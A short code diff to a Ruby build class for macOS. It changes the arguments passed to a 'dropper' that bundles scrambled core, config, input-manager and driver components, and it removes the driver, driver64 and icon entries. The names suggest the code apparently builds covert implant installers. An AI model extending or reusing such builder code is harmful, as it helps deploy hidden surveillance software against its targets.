@@ -108,10 +108,7 @@ class BuildOSX < Build
 
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:config])+' '+
-                                        path(@scrambled[:driver])+' '+
-                                        path(@scrambled[:driver64])+' '+
                                         path(@scrambled[:inputmanager])+' '+
-                                        path(@scrambled[:icon])+' '+
                                         @scrambled[:dir]+' '+
                                         (@demo ? path('demo_image') : 'null') +' '+
                                         executable + ' ' +
